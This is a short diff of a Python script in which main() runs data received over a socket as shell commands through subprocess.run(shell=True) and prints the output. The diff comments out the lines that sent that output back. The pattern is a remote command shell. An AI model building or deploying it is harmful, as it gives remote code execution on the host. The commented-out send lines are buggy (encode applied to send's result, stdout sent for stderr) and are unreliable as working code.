@@ -30,10 +30,10 @@ def main():
             process = subprocess.run(rData, shell=True, capture_output=True, text=True, timeout=15)
             if process.stdout:
                 print(process.stdout.strip())
-                c.send(process.stdout.strip()).encode()
+                #c.send(process.stdout.strip()).encode()
             if process.stderr:
                 print(process.stderr.strip())
-                c.send(process.stdout.strip()).encode()
+                #c.send(process.stdout.strip()).encode()
             break
         
     print("<==== End transmission ====>")
